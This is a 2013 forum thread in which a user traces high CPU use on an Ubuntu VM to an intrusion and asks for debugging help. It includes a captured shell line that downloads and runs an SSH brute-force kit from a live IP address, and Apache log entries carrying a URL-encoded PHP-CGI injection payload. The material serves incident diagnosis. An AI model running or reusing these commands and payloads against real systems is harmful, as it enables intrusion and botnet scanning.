---
title: "Ubuntu 12.04 /sbin/init running at 100% CPU"
date: 2013-11-10
forum: General Help
---

### Post by paulroberts on 2013-11-10
Hi,

I've been running Ubuntu 12.04 for about a year now in a VirtualBox environment, it's been running SugarCRM fine (CE edition v6.5.16), but recently I've noticed that /sbin/init has been running at 100% CPU. Sometimes there are multiple processes running and the whole system grinds to a halt.

I did see some weird stuff in one case, lots of SYN_SENT half open TCP connections to port 22(ssh) on loads of sequential IP addresses, like my system has been hacked and it's scanning for open systems, but right now I am not seeing this, just one init processing consuming all CPU resource. If I reboot or do a kill -9 on the process, it will be okay for a while, but within 30 minutes it's back at 100% CPU again.

If I have been hacked, I have added a rule on my firewall to block outbound connections to port 22, but in the meantime I am struggling to work out what exactly /sbin/init is doing as strace just seems to indicate it's in some kind of loop. Here's some output:

```
top - 23:19:15 up  3:21,  5 users,  load average: 1.03, 1.08, 1.06
Tasks: 169 total,   2 running, 167 sleeping,   0 stopped,   0 zombie
Cpu(s): 42.5%us,  8.5%sy,  0.0%ni, 48.7%id,  0.0%wa,  0.0%hi,  0.3%si,  0.0%st
Mem:   2061432k total,  1109640k used,   951792k free,   154196k buffers
Swap:   522236k total,        0k used,   522236k free,   535040k cached

  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
 9009 daemon    20   0  5312 2232  796 R  100  0.1 128:52.78 /sbin/init
 2110 paul      20   0  183m  20m  12m S    1  1.0   1:14.34 gnome-terminal
 2185 paul      20   0  2852 1248  948 S    1  0.1   0:48.05 top
    9 root      20   0     0    0    0 S    0  0.0   0:07.17 kworker/1:0
 1354 root      20   0 98.4m  38m 7396 S    0  1.9   1:13.49 Xorg
 2373 paul      20   0  4700 1188  940 S    0  0.1   0:12.50 watch
21340 paul      20   0  2852 1156  872 R    0  0.1   0:00.05 top
    1 root      20   0  3644 1984 1244 S    0  0.1   0:01.43 init
    2 root      20   0     0    0    0 S    0  0.0   0:00.02 kthreadd
    3 root      20   0     0    0    0 S    0  0.0   0:00.51 ksoftirqd/0
```

Running strace on PID 9009 doesn't really show much, just tons and tons of this:

```
select(8, [4], NULL, NULL, {0, 0})      = 0 (Timeout)
select(8, [4], NULL, NULL, {0, 0})      = 0 (Timeout)
select(8, [4], NULL, NULL, {0, 0})      = 0 (Timeout)
select(8, [4], NULL, NULL, {0, 0})      = 0 (Timeout)
select(8, [4], NULL, NULL, {0, 0})      = 0 (Timeout)
select(8, [4], NULL, NULL, {0, 0})      = 0 (Timeout)
select(8, [4], NULL, NULL, {0, 0})      = 0 (Timeout)
select(8, [4], NULL, NULL, {0, 0})      = 0 (Timeout)
select(8, [4], NULL, NULL, {0, 0})      = 0 (Timeout)
select(8, [4], NULL, NULL, {0, 0})      = 0 (Timeout)
select(8, [4], NULL, NULL, {0, 0})      = 0 (Timeout)
^CProcess 9009 detached
```

I set logging level to "debug" with initctl log-priority to see if syslog would tell me anything, but apart from the odd job being registered there's not much happening:

```
Nov 10 23:25:01 ubuntu-vm-1 CRON[21956]: (root) CMD (cd /opt/sugarcrm-6.4.4/apps/sugarcrm/htdocs; php -f cron.php > /dev/null 2>&1)
Nov 10 23:26:02 ubuntu-vm-1 CRON[22046]: (root) CMD (cd /opt/sugarcrm-6.4.4/apps/sugarcrm/htdocs; php -f cron.php > /dev/null 2>&1)
Nov 10 23:27:01 ubuntu-vm-1 CRON[22138]: (root) CMD (cd /opt/sugarcrm-6.4.4/apps/sugarcrm/htdocs; php -f cron.php > /dev/null 2>&1)
Nov 10 23:27:23 ubuntu-vm-1 AptDaemon: INFO: Quitting due to inactivity
Nov 10 23:27:23 ubuntu-vm-1 AptDaemon: INFO: Quitting was requested
Nov 10 23:27:23 ubuntu-vm-1 dbus[661]: [system] Activating service name='org.debian.apt' (using servicehelper)
Nov 10 23:27:23 ubuntu-vm-1 AptDaemon: INFO: Initializing daemon
Nov 10 23:27:23 ubuntu-vm-1 dbus[661]: [system] Successfully activated service 'org.debian.apt'
Nov 10 23:27:23 ubuntu-vm-1 AptDaemon.PackageKit: INFO: Initializing PackageKit compat layer
Nov 10 23:28:01 ubuntu-vm-1 CRON[22234]: (root) CMD (cd /opt/sugarcrm-6.4.4/apps/sugarcrm/htdocs; php -f cron.php > /dev/null 2>&1)
Nov 10 23:29:01 ubuntu-vm-1 CRON[22327]: (root) CMD (cd /opt/sugarcrm-6.4.4/apps/sugarcrm/htdocs; php -f cron.php > /dev/null 2>&1)
Nov 10 23:30:01 ubuntu-vm-1 CRON[22419]: (root) CMD (cd /opt/sugarcrm-6.4.4/apps/sugarcrm/htdocs; php -f cron.php > /dev/null 2>&1)

```

Has anybody got any ideas how I can debug this and work out WTH is going on? ;-)

Cheers,

Paul

---

### Post by paulroberts on 2013-11-18
Seems like I am the victim of some kind of exploit, I found it running on my machine this morning, scanning an IP range for port 22, because I had blocked outbound port 22 on my firewall nothing got out, but it consume 100% on both my Ubuntu VM and my f/w. I found this running:

```
daemon   20176     1  0 11:02 ?        00:00:00 sh -c crontab -r ; killall -9 perl ; cd /tmp/ ; rm -rf * ; rm -rf .* ; cd /var/tmp/ ; rm -rf .* ; rm -rf * ; wget [http://88.191.144.153/sshd.tar](http://88.191.144.153/sshd.tar) ; tar xvf sshd.tar ; tar zxvf sshd.tar ; cd .ssh_auth/.d ; chmod +x * ; ./dns-pool
daemon   20191 20176  0 11:02 ?        00:00:00 /bin/bash ./dns-pool
daemon   20686 20191  0 12:08 ?        00:00:00 /bin/bash ./su 132.77
daemon   20694 20686 98 12:08 ?        00:05:56 ./ps 132.77 22
```

And these files had been dropped into /var/tmp (I tar'ed them up and deleted them)...

```
-rw-r--r-- daemon/daemon 1873920 2013-11-11 01:28 ./sshd.tar
drwxr-xr-x daemon/daemon       0 2013-11-11 01:27 ./.ssh_auth/
drwxr-xr-x daemon/daemon       0 2013-11-18 12:25 ./.ssh_auth/.d/
-rwxr-xr-x daemon/daemon    1161 2013-03-13 20:22 ./.ssh_auth/.d/dns-pool
-rwxr-xr-x daemon/daemon      46 2013-11-11 01:27 ./.ssh_auth/.d/pass.txt
-rwxr-xr-x daemon/daemon     154 2013-11-05 04:13 ./.ssh_auth/.d/print
-rwxr-xr-x daemon/daemon 1384518 2005-06-05 21:24 ./.ssh_auth/.d/brute
-rw-r--r-- daemon/daemon       0 2013-11-18 12:25 ./.ssh_auth/.d/scan.log
-rw-r--r-- daemon/daemon       0 2013-11-18 12:24 ./.ssh_auth/.d/46.0.pscan.22
-rwxr-xr-x daemon/daemon  453972 2011-03-21 15:15 ./.ssh_auth/.d/ss
-rwxr-xr-x daemon/daemon     520 2013-11-06 01:33 ./.ssh_auth/.d/su
-rwxr-xr-x daemon/daemon   16071 2012-08-12 17:19 ./.ssh_auth/.d/ps
-rw-r--r-- daemon/daemon       0 2013-11-18 12:25 ./.ssh_auth/.d/t.log
```

Some of these are binaries, I have read that "ss" is a port scanner.

Interestingly, [http://88.191.144.153/sshd.tar](http://88.191.144.153/sshd.tar) is still live, but not sure how the payload got activated, I am running a Qualys scan at the moment so see what/if vulnerabilities I've got on this system. I'm guessing it probably got in via the packaged up Apache/MySQL builds that came with SugarCRM. What fun!

---

### Post by paulroberts on 2013-11-18
So, tonight my server has been running at 100% again, despite getting rid of the infection something else has been going on. This time it was the sshd process and strace just showed it looping again. Did some digging around and think it may be a PHP5 remote exploit, then had a look in my apache access_log:

```
.
.
.
64.39.111.93 - - [18/Nov/2013:14:18:39 +0000] "GET /cgi-bin/moin_static181/classic/css/print.css HTTP/1.1" 404 242
64.39.111.93 - - [18/Nov/2013:14:18:39 +0000] "GET /cgi-bin/moin_static190beta2/modernized/css/projection.css HTTP/1.1" 404 255
64.39.111.93 - - [18/Nov/2013:14:18:39 +0000] "GET /cgi-bin/moin_static170beta2/modern/css/msie.css HTTP/1.1" 404 245
64.39.111.93 - - [18/Nov/2013:14:18:40 +0000] "GET /cgi-bin/moin_static184/rightsidebar/css/print.css HTTP/1.1" 404 247
64.39.111.93 - - [18/Nov/2013:14:18:40 +0000] "GET /cgi-bin/moin_static170beta1/modern/css/screen.css HTTP/1.1" 404 247
64.39.111.93 - - [18/Nov/2013:14:18:40 +0000] "GET /cgi-bin/moin_static171/classic/css/msie.css HTTP/1.1" 404 241
64.39.111.93 - - [18/Nov/2013:14:18:40 +0000] "GET /cgi-bin/moin_static183/modernized/css/print.css HTTP/1.1" 404 245
64.39.111.93 - - [18/Nov/2013:14:18:40 +0000] "GET /cgi-bin/moin_static180beta3/modern/css/print.css HTTP/1.1" 404 246
193.26.131.235 - - [18/Nov/2013:14:57:16 +0000] "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 209
193.26.131.235 - - [18/Nov/2013:14:57:18 +0000] "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 210
193.26.131.235 - - [18/Nov/2013:14:57:20 +0000] "POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 504 249
94.102.63.245 - - [18/Nov/2013:20:28:49 +0000] "GET /cgi-bin/php HTTP/1.0" 404 209
173.192.48.66 - - [18/Nov/2013:21:05:15 +0000] "GET /cgi-bin/php HTTP/1.1" 404 209
173.192.48.66 - - [18/Nov/2013:21:05:15 +0000] "GET /cgi-bin/php5 HTTP/1.1" 404 210
173.192.48.66 - - [18/Nov/2013:21:05:15 +0000] "GET /cgi-bin/php-cgi HTTP/1.1" 500 535
173.192.48.66 - - [18/Nov/2013:21:05:16 +0000] "POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 504 249

```

I don't think SugarCRM actually needs CGI, so have removed the CGI script alias setting in my httpd.conf and will be interested to see if that stops it!

---

### Post by Doug S on 2013-11-18
We all get that crap constantly, here is my cgi-bin stuff:```
210.149.29.182 - - [15/Nov/2013:14:20:36 -0800] "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 491 "-" "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
94.102.63.245 - - [16/Nov/2013:17:38:53 -0800] "GET /cgi-bin/php HTTP/1.0" 404 498 "-" "-"
94.102.63.245 - - [17/Nov/2013:13:48:03 -0800] "GET /cgi-bin/php HTTP/1.0" 404 498 "-" "-"
94.102.63.245 - - [17/Nov/2013:17:44:59 -0800] "GET /cgi-bin/php HTTP/1.0" 404 498 "-" "-"
94.102.63.245 - - [17/Nov/2013:18:23:23 -0800] "GET /cgi-bin/php HTTP/1.0" 404 498 "-" "-"
94.102.63.245 - - [17/Nov/2013:18:35:19 -0800] "GET /cgi-bin/php4 HTTP/1.0" 404 499 "-" "-"
94.102.63.245 - - [17/Nov/2013:19:20:16 -0800] "GET /cgi-bin/php4 HTTP/1.0" 404 499 "-" "-"
94.102.63.245 - - [17/Nov/2013:20:01:51 -0800] "GET /cgi-bin/php-cgi HTTP/1.0" 404 502 "-" "-"
94.102.63.245 - - [17/Nov/2013:20:43:23 -0800] "GET /cgi-bin/php4 HTTP/1.0" 404 499 "-" "-"
94.102.63.245 - - [17/Nov/2013:21:24:25 -0800] "GET /cgi-bin/php.cgi HTTP/1.0" 404 502 "-" "-"
94.102.63.245 - - [18/Nov/2013:14:23:44 -0800] "GET /cgi-bin/php HTTP/1.0" 404 498 "-" "-"
```You can tell by your HTTP return codes that they were dealt with properly. This would not explain your 100% CPU usage.

Edit: Note that one of the IP addresses is even the same as your post.

---

